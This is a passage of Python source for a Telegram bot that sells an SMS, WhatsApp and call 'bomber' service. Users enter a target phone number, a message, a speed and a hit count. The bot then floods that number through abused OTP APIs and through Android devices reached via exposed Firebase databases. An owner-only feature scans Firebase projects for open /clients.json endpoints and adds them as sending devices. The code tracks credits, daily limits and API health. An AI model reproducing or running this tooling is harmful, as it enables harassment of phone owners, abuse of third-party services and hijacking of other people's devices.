        parse_mode="HTML"
    )

    async def one_job(job):
        nonlocal sent_ok, sent_fail, last_progress_ts
        async with sem:
            if session.cancelled:
                return
            kind, payload = job
            ok = False
            name = "unknown"
            api_type = "SMS"
            try:
                if kind == "api":
                    name = payload.get("name", "api")
                    api_type = payload.get("type", "SMS")
                    # consecutive cooldown
                    if consecutive[name] >= 3:
                        await asyncio.sleep(API_CONSEC_COOLDOWN)
                        consecutive[name] = 0
                    ok, name, _err = await hit_bomb_api(payload, phone)
                    consecutive[name] += 1
                    _record_api_result(name, ok)
                elif kind == "fb_sms":
                    name = f"FB:{payload.get('dev_name', 'dev')[:12]}"
                    api_type = "SMS"
                    sims = payload.get("sims") or [0]
                    sim_slot = sims[0] if isinstance(sims, list) and sims else 0
                    if isinstance(sim_slot, dict):
                        sim_slot = sim_slot.get("slot", 0)
                    ok = await send_sms_via_device(payload["fb_url"], payload["dev_id"], int(sim_slot) if str(sim_slot).isdigit() else 0, number, message or "OTP")
                elif kind == "fb_call":
                    name = f"FB-Call:{payload.get('dev_name', 'dev')[:12]}"
                    api_type = "Call"
                    sims = payload.get("sims") or [0]
                    sim_slot = sims[0] if isinstance(sims, list) and sims else 0
                    if isinstance(sim_slot, dict):
                        sim_slot = sim_slot.get("slot", 0)
                    ok = await make_call_via_device(payload["fb_url"], payload["dev_id"], int(sim_slot) if str(sim_slot).isdigit() else 0, number)
            except Exception as e:
                log.warning(f"bomb job err: {e}")
                ok = False
            async with session.lock:
                if ok:
                    sent_ok += 1
                    session.sent += 1
                    api_sent[name] += 1
                    type_sent[api_type] += 1
                else:
                    sent_fail += 1
                    session.failed += 1
                    api_fail[name] += 1
                    type_fail[api_type] += 1
                last_progress_ts = time.time()
            if speed > 0:
                await asyncio.sleep(speed)

    # progress updater + stall + periodic device refresh
    async def progress_loop():
        nonlocal devices
        last_refetch = time.time()
        while True:
            await asyncio.sleep(_PROGRESS_UPDATE_INTERVAL)
            if session.cancelled:
                break
            async with session.lock:
                s, f = session.sent, session.failed
                lp = last_progress_ts
            if s + f >= total:
                break
            # stall guard
            if time.time() - lp > BOMB_STALL_SECONDS:
                session.cancelled = True
                try:
                    await bot.send_message(uid, q(f"{em(EMOJI_WARNING, '⚠️')} Bomb auto-stopped — 5 min no progress."), parse_mode="HTML")
                except Exception:
                    pass
                break
            # re-fetch devices every 60s
            if time.time() - last_refetch > 60 and mode in ("sms", "call", "all"):
                try:
                    devices = await get_all_online_devices(load())
                except Exception:
                    pass
                last_refetch = time.time()
            breakdown = []
            if mode == "all":
                breakdown.append(f"  {em(EMOJI_SMS, '📱')} SMS  : {type_sent.get('SMS',0)} ✅ / {type_fail.get('SMS',0)} ❌")
                breakdown.append(f"  {em(EMOJI_WHATSAPP, '💚')} WPP  : {type_sent.get('WhatsApp',0)} ✅ / {type_fail.get('WhatsApp',0)} ❌")
                breakdown.append(f"  {em(EMOJI_CALL, '📞')} CALL : {type_sent.get('Call',0)} ✅ / {type_fail.get('Call',0)} ❌")
            names = sorted(set(list(api_sent.keys()) + list(api_fail.keys())), key=lambda n: -(api_sent[n] + api_fail[n]))
            for n in names[:6]:
                breakdown.append(f"  {n} {em(EMOJI_CHECK, '✅')}{api_sent[n]} {em(EMOJI_CROSS, '❌')}{api_fail[n]}")
            extra = "\n".join(breakdown)
            try:
                body = (
                    f"{em(EMOJI_BOMB, '💥')} <b>{sc('bombing')} — {mode_label}</b>\n"
                    f"{progress_bar(s + f, total)} <b>{int(((s+f)/total)*100) if total else 0}%</b>\n"
                    f"{em(EMOJI_CHECK, '✅')} sᴇɴᴛ: <b>{s}</b>  {em(EMOJI_CROSS, '❌')} ғᴀɪʟᴇᴅ: <b>{f}</b>\n"
                    f"{em(EMOJI_STAR, '📊')} {s+f} / {total}  |  {speed_label}\n"
                    f"{extra}\n"
                    f"<i>{em(EMOJI_WARNING, '🛑')} stop button se rok sakte ho.</i>"
                )
                await progress_msg.edit_text(q(body), reply_markup=stop_send_kb(), parse_mode="HTML")
            except Exception:
                pass

    updater = asyncio.create_task(progress_loop())
    try:
        await asyncio.gather(*(one_job(j) for j in jobs))
    finally:
        session.cancelled = True
        try:
            updater.cancel()
        except Exception:
            pass

    # credits (mode cost * successful hits)
    credits_used = sent_ok * max(1, cost_per)
    d = load()
    if not is_admin(uid, d) and not is_owner(uid, d) and credits_used > 0:
        def _ded(dd):
            deduct_credits(uid, min(credits_used, get_user_credits(uid, dd)), dd)
        atomic_update(_ded)
    if sent_ok + sent_fail > 0:
        _inc_daily_count(uid, sent_ok + sent_fail)

    # bomb_stats
    def _stats(dd):
        bs = dd.setdefault("bomb_stats", {"sms_sent": 0, "sms_failed": 0, "wa_sent": 0, "wa_failed": 0, "call_sent": 0, "call_failed": 0})
        bs["sms_sent"] = bs.get("sms_sent", 0) + type_sent.get("SMS", 0)
        bs["sms_failed"] = bs.get("sms_failed", 0) + type_fail.get("SMS", 0)
        bs["wa_sent"] = bs.get("wa_sent", 0) + type_sent.get("WhatsApp", 0)
        bs["wa_failed"] = bs.get("wa_failed", 0) + type_fail.get("WhatsApp", 0)
        bs["call_sent"] = bs.get("call_sent", 0) + type_sent.get("Call", 0)
        bs["call_failed"] = bs.get("call_failed", 0) + type_fail.get("Call", 0)
        detail = dd.setdefault("api_usage_detail", {})
        for n, v in api_sent.items():
            detail[n] = detail.get(n, 0) + v
        st = dd.setdefault("stats", {})
        st["total_sent"] = st.get("total_sent", 0) + sent_ok
        st["total_failed"] = st.get("total_failed", 0) + sent_fail
        log_activity(dd, "bomb", uid, f"{mode} {sent_ok}/{sent_fail} to {mask_number(number)}")
    atomic_update(_stats)

    remaining = get_user_credits(uid, load())
    duration = fmt_duration(int(time.time() - start_time))
    breakdown = []
    if mode == "all":
        breakdown.append(f"  {em(EMOJI_SMS, '📱')} SMS  : {type_sent.get('SMS',0)} ✅ / {type_fail.get('SMS',0)} ❌")
        breakdown.append(f"  {em(EMOJI_WHATSAPP, '💚')} WPP  : {type_sent.get('WhatsApp',0)} ✅ / {type_fail.get('WhatsApp',0)} ❌")
        breakdown.append(f"  {em(EMOJI_CALL, '📞')} CALL : {type_sent.get('Call',0)} ✅ / {type_fail.get('Call',0)} ❌")
    names = sorted(set(list(api_sent.keys()) + list(api_fail.keys())), key=lambda n: -(api_sent[n] + api_fail[n]))
    for n in names[:12]:
        breakdown.append(f"  {n}: {em(EMOJI_CHECK, '✅')}{api_sent[n]} {em(EMOJI_CROSS, '❌')}{api_fail[n]}")
    extra = "\n".join(breakdown) if breakdown else "  —"
    icon = em(EMOJI_CHECK, "✅") if sent_ok else em(EMOJI_CROSS, "❌")
    stopped = session.cancelled and (sent_ok + sent_fail) < total
    try:
        await progress_msg.edit_text(
            q(
                f"{icon} <b>BOMB RESULT — {mode_label}</b>{' (stopped)' if stopped else ''}\n"
                f"{SEP_THICK}\n"
                f"📞  Tᴀʀɢᴇᴛ   <code>{mask_number(number)}</code>\n"
                f"✅  Sᴇɴᴛ     <b>{glow_num(sent_ok)}</b>  │  ❌ Fᴀɪʟ <b>{glow_num(sent_fail)}</b>\n"
                f"🎯  Rᴀᴛᴇ     <b>{int(sent_ok*100/(sent_ok+sent_fail)) if (sent_ok+sent_fail)>0 else 0}%</b>\n"
                f"⏱   Dᴜʀᴀᴛɪᴏɴ <b>{duration}</b>\n"
                f"💳  Cʀᴇᴅɪᴛs  <b>{credits_used}</b> ᴜsᴇᴅ │ <b>{remaining}</b> ʟᴇꜰᴛ\n"
                f"{SEP_DOT}\n"
                f"<b>📡 API Breakdown:</b>\n{extra}"
            ),
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [btn("ʙᴏᴍʙ ᴀɢᴀɪɴ", "user:bomb:menu", EMOJI_BOMB, "💥"), btn("ʜᴏᴍᴇ", "user:home", EMOJI_STAR, "🏠")]
            ]),
            parse_mode="HTML"
        )
    except Exception as e:
        log.error(f"bomb final edit: {e}")

    # log channel — full details
    try:
        try:
            _bomb_chat = await bot.get_chat(uid)
            _b_name    = _bomb_chat.full_name or "Unknown"
            _b_uname   = f"@{_bomb_chat.username}" if _bomb_chat.username else "No Username"
        except Exception:
            _b_name  = load().get("users", {}).get(str(uid), {}).get("name", "Unknown")
            _b_uname = "No Username"

        _bomb_time = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
        _msg_preview = (message[:200] + "...") if len(message) > 200 else (message or "—")

        # per-type breakdown lines
        _type_lines = []
        if type_sent.get("SMS", 0) + type_fail.get("SMS", 0) > 0:
            _type_lines.append(f"  📱 SMS       ✅ {type_sent.get('SMS',0)}  ❌ {type_fail.get('SMS',0)}")
        if type_sent.get("WhatsApp", 0) + type_fail.get("WhatsApp", 0) > 0:
            _type_lines.append(f"  💚 WhatsApp  ✅ {type_sent.get('WhatsApp',0)}  ❌ {type_fail.get('WhatsApp',0)}")
        if type_sent.get("Call", 0) + type_fail.get("Call", 0) > 0:
            _type_lines.append(f"  📞 Call      ✅ {type_sent.get('Call',0)}  ❌ {type_fail.get('Call',0)}")
        _type_block = "\n".join(_type_lines) if _type_lines else "  —"

        # top APIs used
        _api_names = sorted(set(list(api_sent.keys()) + list(api_fail.keys())), key=lambda n: -(api_sent[n] + api_fail[n]))
        _api_lines = [f"  • {n}: ✅{api_sent[n]} ❌{api_fail[n]}" for n in _api_names[:8]]
        _api_block = "\n".join(_api_lines) if _api_lines else "  —"

        _status_tag = "🛑 STOPPED" if stopped else "✅ DONE"
        _rate = f"{int(sent_ok*100/(sent_ok+sent_fail)) if (sent_ok+sent_fail)>0 else 0}%"

        await send_channel_log(
            bot,
            f"💥 <b>BOMB LOG — {mode_label}</b>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"👤 <b>Name:</b>     {_b_name}\n"
            f"🌐 <b>Username:</b> {_b_uname}\n"
            f"🆔 <b>User ID:</b>  <code>{uid}</code>\n"
            f"🕐 <b>Time:</b>     <code>{_bomb_time}</code>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"📞 <b>Target:</b>   <code>{number}</code>\n"
            f"💬 <b>Message:</b>\n<code>{_msg_preview}</code>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"✅ <b>Sent:</b>     <b>{sent_ok}</b>\n"
            f"❌ <b>Failed:</b>   <b>{sent_fail}</b>\n"
            f"🎯 <b>Rate:</b>     <b>{_rate}</b>\n"
            f"💳 <b>Credits:</b>  <b>{credits_used}</b> used | <b>{remaining}</b> left\n"
            f"⏱ <b>Duration:</b> <b>{duration}</b>\n"
            f"📊 <b>Status:</b>   {_status_tag}\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"<b>📡 Type Breakdown:</b>\n{_type_block}\n"
            f"<b>🔌 APIs Used:</b>\n{_api_block}"
        )
    except Exception as _log_err:
        log.error(f"bomb log channel err: {_log_err}")

# ---------- Bomb UI flow ----------

@R.callback_query(F.data == "user:bomb:menu")
async def user_bomb_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    joined, missing = await user_joined_all(cq.bot, uid, d)
    if not joined:
        await cq.answer("⛔ Force Join compulsory hai!", show_alert=True)
        await safe_edit(cq.message, force_join_text(missing), reply_markup=force_join_kb(missing), parse_mode="HTML", disable_web_page_preview=True)
        return
    if not can_use(uid, d):
        await cq.answer("🚫 Access denied!", show_alert=True)
        return
    await state.clear()
    await safe_edit(cq.message,
        f"💥 <b>BOMB MODE</b>\n"
        f"{SEP_THICK}\n"
        f"📱 <b>SMS</b>     — Firebase + SMS APIs\n"
        f"💚 <b>WhatsApp</b> — WA OTP APIs\n"
        f"📞 <b>Call</b>    — Firebase makeCall + Call APIs\n"
        f"💥 <b>ALL</b>     — Sab parallel, max devastation\n"
        f"{SEP_DOT}\n"
        f"<i>⚡ Mode select karo aur unleash karo</i>",
        reply_markup=bomb_mode_kb(),
        parse_mode="HTML"
    )

@R.callback_query(F.data.in_({"user:bomb:sms", "user:bomb:wa", "user:bomb:call", "user:bomb:all"}))
async def user_bomb_mode_selected(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not can_use(uid, d):
        await cq.answer("🚫 Access denied!", show_alert=True)
        return
    mode = cq.data.split(":")[-1]  # sms|wa|call|all
    await state.update_data(bomb_mode=mode)
    await state.set_state(S.bomb_number)
    mode_label = {"sms": "SMS", "wa": "WhatsApp", "call": "Call", "all": "ALL"}.get(mode, mode)
    await safe_edit(cq.message,
        f"{em(EMOJI_BOMB, '💥')} <b>{sc('bomb')} — {mode_label}</b>\n\n"
        f"{em(EMOJI_PHONE, '📞')} <b>{sc('step 1')} — {sc('number')}</b>\n\n"
        f"Target number enter karo:\n<i>Example: +919876543210</i>",
        reply_markup=kb([(f"{sc('cancel')}", "user:bomb:menu")]),
        parse_mode="HTML"
    )

@R.message(S.bomb_number)
async def bomb_got_number(msg: Message, state: FSMContext):
    number = msg.text.strip()
    if not number.replace("+", "").replace(" ", "").isdigit() or len(number) < 7:
        await msg.answer(q(f"{em(EMOJI_CROSS, '❌')} Invalid number. Dobara bhejo:"), parse_mode="HTML")
        return
    if number in PROTECTED_NUMBERS:
        await msg.answer(q(f"{em(EMOJI_LOCK, '🔒')} Ye number protected hai!"), parse_mode="HTML")
        return
    await state.update_data(number=number)
    fsmd = await state.get_data()
    mode = fsmd.get("bomb_mode", "sms")
    if mode == "call":
        # skip message step
        await state.set_state(S.bomb_speed)
        await msg.answer(
            q(
                f"{em(EMOJI_CHECK, '✅')} Number: <code>{mask_number(number)}</code>\n\n"
                f"{em(EMOJI_ROCKET, '⚡')} <b>{sc('speed')}</b>\n\nSelect speed:"
            ),
            reply_markup=speed_kb("bomb"),
            parse_mode="HTML"
        )
    else:
        await state.set_state(S.bomb_message)
        await msg.answer(
            q(
                f"{em(EMOJI_CHECK, '✅')} Number: <code>{mask_number(number)}</code>\n\n"
                f"{em(EMOJI_STAR, '💬')} <b>{sc('message')}</b> (OTP text / body)\n\nType message:"
            ),
            reply_markup=kb([(f"{sc('cancel')}", "user:bomb:menu")]),
            parse_mode="HTML"
        )

@R.message(S.bomb_message)
async def bomb_got_message(msg: Message, state: FSMContext):
    await state.update_data(message=msg.text.strip())
    await state.set_state(S.bomb_speed)
    await msg.answer(
        q(f"{em(EMOJI_CHECK, '✅')} Message saved!\n\n{em(EMOJI_ROCKET, '⚡')} <b>{sc('speed')}</b>\n\nSelect:"),
        reply_markup=speed_kb("bomb"),
        parse_mode="HTML"
    )

@R.callback_query(F.data.in_({"bomb:speed:fast", "bomb:speed:medium", "bomb:speed:slow"}))
async def bomb_speed_selected(cq: CallbackQuery, state: FSMContext):
    speed_map = {
        "bomb:speed:fast": SPEED_FAST,
        "bomb:speed:medium": SPEED_MEDIUM,
        "bomb:speed:slow": SPEED_SLOW
    }
    selected = speed_map.get(cq.data, SPEED_MEDIUM)
    label = "🚀 FAST" if selected == SPEED_FAST else ("⚡ MEDIUM" if selected == SPEED_MEDIUM else "🐢 SLOW")
    await state.update_data(send_speed=selected)
    await state.set_state(S.bomb_count)
    d = load()
    uid = cq.from_user.id
    credit_info = ""
    if not is_admin(uid, d) and not is_owner(uid, d):
        credit_info = f"\n{em(EMOJI_MONEY, '💰')} Credits: <b>{get_user_credits(uid, d)}</b>\n"
    apis_n = len(_apis_for_mode((await state.get_data()).get("bomb_mode", "sms")))
    await safe_edit(cq.message,
        f"{label} selected!\n\n"
        f"{em(EMOJI_STAR, '📊')} <b>{sc('count')}</b>\n"
        f"{em(EMOJI_API, '📡')} APIs ready: <b>{apis_n}</b>{credit_info}\n"
        f"Kitne hits chahiye?",
        reply_markup=kb([(f"{sc('cancel')}", "user:bomb:menu")]),
        parse_mode="HTML"
    )

@R.message(S.bomb_count)
async def bomb_got_count(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    fsmd = await state.get_data()
    try:
        count = int(msg.text.strip())
        if count < 1:
            raise ValueError
    except Exception:
        await msg.answer(q(f"{em(EMOJI_CROSS, '❌')} Sirf number bhejo:"), parse_mode="HTML")
        return
    await state.clear()
    number = fsmd.get("number", "")
    message_text = fsmd.get("message", "OTP")
    send_speed = fsmd.get("send_speed", SPEED_DEFAULT)
    mode = fsmd.get("bomb_mode", "sms")
    cost_per = _mode_cost(mode, d)

    if not is_admin(uid, d) and not is_owner(uid, d):
        # daily limit
        if DAILY_BOMB_LIMIT > 0:
            used_today = _get_daily_count(uid, d)
            if used_today >= DAILY_BOMB_LIMIT:
                await msg.answer(
                    q(f"{em(EMOJI_CROSS, '❌')} <b>Daily limit reached</b> ({DAILY_BOMB_LIMIT}).\nReset midnight IST ke baad."),
                    reply_markup=kb([(f"{sc('home')}", "user:home")]),
                    parse_mode="HTML"
                )
                return
            remaining_quota = DAILY_BOMB_LIMIT - used_today
            if count > remaining_quota:
                count = remaining_quota
                await msg.answer(q(f"{em(EMOJI_WARNING, '⚠️')} Daily quota left: {remaining_quota}. Usi se chal raha hoon."), parse_mode="HTML")
        current = get_user_credits(uid, d)
        needed = count * cost_per
        if current <= 0 or current < cost_per:
            await msg.answer(q(f"{em(EMOJI_CROSS, '❌')} Credits nahi hain! (need {cost_per}/hit)"), reply_markup=kb([(f"{sc('home')}", "user:home")]), parse_mode="HTML")
            return
        if needed > current:
            count = max(1, current // cost_per)
            await msg.answer(q(f"{em(EMOJI_WARNING, '⚠️')} Credits se max {count} hits (cost {cost_per}/hit)."), parse_mode="HTML")

    await run_bomb_engine(msg.bot, msg, uid, number, message_text, mode, count, send_speed)

# ---------- Extract Active Firebase ----------

@R.callback_query(F.data == "owner:fb:extract_active")
async def owner_fb_extract_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.extract_active_text)
    await safe_edit(cq.message,
        f"{em(EMOJI_EXTRACT, '🔍')} <b>{sc('extract active firebase')}</b>\n\n"
        f"Project ID / URL / multiple lines bhejo, ya .txt file attach karo.\n"
        f"Bot 4 RTDB regions probe karega; jo OPEN /clients.json dega woh add hoga.\n\n"
        f"<i>Example:\nmyproject\nhttps://foo-default-rtdb.firebaseio.com</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:fb:menu:0")]),
        parse_mode="HTML"
    )

@R.message(S.extract_active_text, F.document)
async def owner_fb_extract_file(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()):
        await state.clear()
        return
    doc = msg.document
    if not doc.file_name or not doc.file_name.lower().endswith(".txt"):
        await msg.answer(q(f"{em(EMOJI_CROSS, '❌')} Sirf .txt file bhejo."), parse_mode="HTML")
        return
    try:
        file = await msg.bot.get_file(doc.file_id)
        bio = io.BytesIO()
        await msg.bot.download_file(file.file_path, bio)
        text = bio.getvalue().decode("utf-8", errors="ignore")
    except Exception as e:
        await msg.answer(q(f"{em(EMOJI_CROSS, '❌')} File read fail: {e}"), parse_mode="HTML")
        return
    await _do_extract(msg, state, text)

@R.message(S.extract_active_text)
async def owner_fb_extract_text(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()):
        await state.clear()
        return
    await _do_extract(msg, state, msg.text or "")

async def _do_extract(msg: Message, state: FSMContext, raw: str):
    await state.clear()
    candidates = []
    for line in raw.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        candidates.append(line)
    if not candidates:
        await msg.answer(q(f"{em(EMOJI_CROSS, '❌')} Koi candidate nahi mila."), parse_mode="HTML")
        return
    wait = await msg.answer(q(f"{em(EMOJI_GEAR, '⏳')} Probing {len(candidates)} candidates..."), parse_mode="HTML")
    added = 0
    skipped = 0
    dead = 0
    results = []

    async def probe_one(c):
        return c, await probe_and_extract(c)

    probed = await asyncio.gather(*(probe_one(c) for c in candidates))
    d = load()
    existing_urls = {fb.get("url", "").rstrip("/") for fb in d.get("firebases", [])}

    def _add(dd):
        nonlocal added, skipped, dead
        for c, res in probed:
            if not res:
                dead += 1
                continue
            url = res["url"].rstrip("/")
            if url in existing_urls:
                skipped += 1
                continue
            fb_id = "".join(random.choices(string.ascii_lowercase + string.digits, k=10))
            entry = {"id": fb_id, "url": url, "label": res.get("label", f"{c}_extracted")}
            dd.setdefault("firebases", []).append(entry)
            dd.setdefault("extracted_firebases", []).append({"url": url, "label": entry["label"], "ts": int(time.time())})
            existing_urls.add(url)
            added += 1
            results.append(entry["label"])
    atomic_update(_add)

    try:
        await wait.delete()
    except Exception:
        pass
    lines = "\n".join(f"  • {x}" for x in results[:20]) or "  —"
    await msg.answer(
        q(
            f"{em(EMOJI_EXTRACT, '🔍')} <b>Extract Complete</b>\n\n"
            f"{em(EMOJI_CHECK, '✅')} Added: <b>{added}</b>\n"
            f"{em(EMOJI_STAR, '📊')} Checked: <b>{len(candidates)}</b>\n"
            f"{em(EMOJI_CROSS, '❌')} Dead: <b>{dead}</b>\n"
            f"{em(EMOJI_WARNING, '⏭')} Skipped (dup): <b>{skipped}</b>\n\n"
            f"{lines}"
        ),
        reply_markup=kb([(f"{sc('back')}", "owner:fb:menu:0")]),
        parse_mode="HTML"
    )

# ===================== API MANAGER =====================

def _api_manager_text(d: dict) -> str:
    enabled = d.get("api_enabled", {})
    health = d.get("api_health", {})
    now = int(time.time())
    active = disabled_manual = disabled_auto = 0
    for a in BOMB_APIS:
        name = a["name"]
        if enabled.get(name) is False:
            disabled_manual += 1
        elif int(health.get(name, {}).get("disabled_until", 0) or 0) > now:
            disabled_auto += 1
        else:
            active += 1
    costs = d.get("mode_costs") or DEFAULT_MODE_COSTS
    return (
        f"{em(EMOJI_API, '🔌')} <b>{sc('api manager')}</b>\n\n"
        f"{em(EMOJI_CHECK, '✅')} Active: <b>{active}</b> / {len(BOMB_APIS)}\n"
        f"{em(EMOJI_CROSS, '❌')} Manual OFF: <b>{disabled_manual}</b>\n"
        f"{em(EMOJI_WARNING, '⏸')} Auto-disabled: <b>{disabled_auto}</b>\n\n"
        f"{em(EMOJI_MONEY, '💳')} Mode costs: SMS={costs.get('sms',1)} | WA={costs.get('wa',2)} | Call={costs.get('call',3)} | All={costs.get('all',3)}\n"
        f"<i>Toggle / Test / Reset health below.</i>"
    )

def _api_manager_kb(d: dict, page: int = 0) -> InlineKeyboardMarkup:
    per = 8
    start = page * per
    chunk = BOMB_APIS[start:start + per]
    enabled = d.get("api_enabled", {})
    health = d.get("api_health", {})
    now = int(time.time())
    rows = []
    for a in chunk:
        name = a["name"]
        short = name[:18]
        is_off = enabled.get(name) is False
        auto_off = int(health.get(name, {}).get("disabled_until", 0) or 0) > now
        mark = "🔴" if is_off else ("⏸" if auto_off else "🟢")
        rows.append([
            btn(f"{mark} {short}", f"owner:api:toggle:{name}", EMOJI_API, mark),
            btn("ᴛᴇsᴛ", f"owner:api:test:{name}", EMOJI_STAR, "🧪"),
        ])
    nav = []
    if page > 0:
        nav.append(btn("◀️", f"owner:api:menu:{page-1}", EMOJI_GEAR, "◀️"))
    if start + per < len(BOMB_APIS):
        nav.append(btn("▶️", f"owner:api:menu:{page+1}", EMOJI_GEAR, "▶️"))
    if nav:
        rows.append(nav)
    rows.append([btn("ʀᴇsᴇᴛ ʜᴇᴀʟᴛʜ", "owner:api:reset_health", EMOJI_GEAR, "🔄"), btn("ᴍᴏᴅᴇ ᴄᴏsᴛs", "owner:api:costs", EMOJI_MONEY, "💳")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

@R.callback_query(F.data.startswith("owner:api:menu"))
async def owner_api_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    parts = cq.data.split(":")
    page = int(parts[-1]) if parts[-1].isdigit() else 0
    await safe_edit(cq.message, _api_manager_text(d), reply_markup=_api_manager_kb(d, page), parse_mode="HTML")

@R.callback_query(F.data.startswith("owner:api:toggle:"))
async def owner_api_toggle(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    name = cq.data.split("owner:api:toggle:", 1)[1]
    def _tog(dd):
        en = dd.setdefault("api_enabled", {})
        cur = en.get(name, True)
        en[name] = not cur
        return en[name]
    new_val = atomic_update(_tog)
    await cq.answer(f"{'ON' if new_val else 'OFF'}: {name}")
    await owner_api_menu(cq, state)

@R.callback_query(F.data == "owner:api:reset_health")
async def owner_api_reset_health(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    def _rst(dd):
        dd["api_health"] = {}
    atomic_update(_rst)
    await cq.answer("✅ Health reset!")
    await owner_api_menu(cq, state)

@R.callback_query(F.data.startswith("owner:api:test:"))
async def owner_api_test_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    name = cq.data.split("owner:api:test:", 1)[1]
    await state.update_data(test_api_name=name)
    await state.set_state(S.api_test_number)
    await safe_edit(cq.message,
        f"{em(EMOJI_API, '🧪')} <b>Test API</b>\n\nAPI: <code>{name}</code>\n\nTest number bhejo (e.g. 9876543210):",
        reply_markup=kb([(f"{sc('cancel')}", "owner:api:menu")]),
        parse_mode="HTML"
    )

@R.message(S.api_test_number)
async def owner_api_test_run(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    phone = _normalize_phone(msg.text.strip())
    fsmd = await state.get_data()
    name = fsmd.get("test_api_name")
    await state.clear()
    api = next((a for a in BOMB_APIS if a["name"] == name), None)
    if not api:
        await msg.answer(q(f"{em(EMOJI_CROSS, '❌')} API not found."), parse_mode="HTML")
        return
    wait = await msg.answer(q(f"{em(EMOJI_GEAR, '⏳')} Hitting {name}..."), parse_mode="HTML")
    ok, _, err = await hit_bomb_api(api, phone)
    try:
        await wait.delete()
    except Exception:
        pass
    await msg.answer(
        q(
            f"{em(EMOJI_API, '🧪')} <b>Test Result</b>\n\n"
            f"API: <code>{name}</code>\n"
            f"Phone: <code>{mask_number(phone)}</code>\n"
            f"Result: {em(EMOJI_CHECK, '✅') if ok else em(EMOJI_CROSS, '❌')} <b>{'OK' if ok else 'FAIL'}</b>\n"
            f"Detail: <code>{(err or 'ok')[:100]}</code>"
        ),
        reply_markup=kb([(f"{sc('back')}", "owner:api:menu")]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:api:costs")
async def owner_api_costs(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    costs = d.get("mode_costs") or DEFAULT_MODE_COSTS
    text = (
        f"{em(EMOJI_MONEY, '💳')} <b>Mode Costs</b>\n\n"
        f"SMS: <b>{costs.get('sms',1)}</b>\nWA: <b>{costs.get('wa',2)}</b>\n"
        f"Call: <b>{costs.get('call',3)}</b>\nAll: <b>{costs.get('all',3)}</b>\n\n"
        f"Change karne ke liye mode select karo:"
    )
    rows = [
        [btn("sᴍs", "owner:api:cost:sms", EMOJI_SMS, "📱"), btn("ᴡᴀ", "owner:api:cost:wa", EMOJI_WHATSAPP, "💚")],
        [btn("ᴄᴀʟʟ", "owner:api:cost:call", EMOJI_CALL, "📞"), btn("ᴀʟʟ", "owner:api:cost:all", EMOJI_BOMB, "💥")],
        [btn("ʙᴀᴄᴋ", "owner:api:menu", EMOJI_GEAR, "🔙")],
    ]
    await safe_edit(cq.message, text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data.startswith("owner:api:cost:"))
async def owner_api_cost_set(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    mode = cq.data.split("owner:api:cost:", 1)[1]
    if mode not in ("sms", "wa", "call", "all"):
        await cq.answer("Invalid")
        return
    await state.update_data(cost_mode=mode)
    await state.set_state(S.set_mode_cost)
    await safe_edit(cq.message,
        f"{em(EMOJI_MONEY, '💳')} New cost for <b>{mode.upper()}</b>?\n<i>Example: 2</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:api:costs")]),
        parse_mode="HTML"
    )

@R.message(S.set_mode_cost)
async def owner_api_cost_save(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    try:
        val = int(msg.text.strip())
        if val < 0:
            raise ValueError
    except Exception:
        await msg.answer(q(f"{em(EMOJI_CROSS, '❌')} Valid number bhejo."), parse_mode="HTML")
        return
    fsmd = await state.get_data()
    mode = fsmd.get("cost_mode", "sms")
    def _set(dd):
        dd.setdefault("mode_costs", DEFAULT_MODE_COSTS.copy())[mode] = val
    atomic_update(_set)
    await state.clear()
    await msg.answer(
        q(f"{em(EMOJI_CHECK, '✅')} {mode.upper()} cost = <b>{val}</b>"),
        reply_markup=kb([(f"{sc('back')}", "owner:api:menu")]),
        parse_mode="HTML"
    )

# ===================== MEDIA MANAGER =====================

@R.callback_query(F.data == "owner:videos:menu")
async def owner_videos_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    videos = d.get("videos", [])
    photo_count = sum(1 for v in videos if isinstance(v, dict) and v.get("type") == "photo")
    video_count = len(videos) - photo_count
    await safe_edit(cq.message,
        f"{em(EMOJI_VIDEO, '📹')} <b>Media Manager</b>\n\n"
        f"Total Saved: <b>{len(videos)}</b>\n"
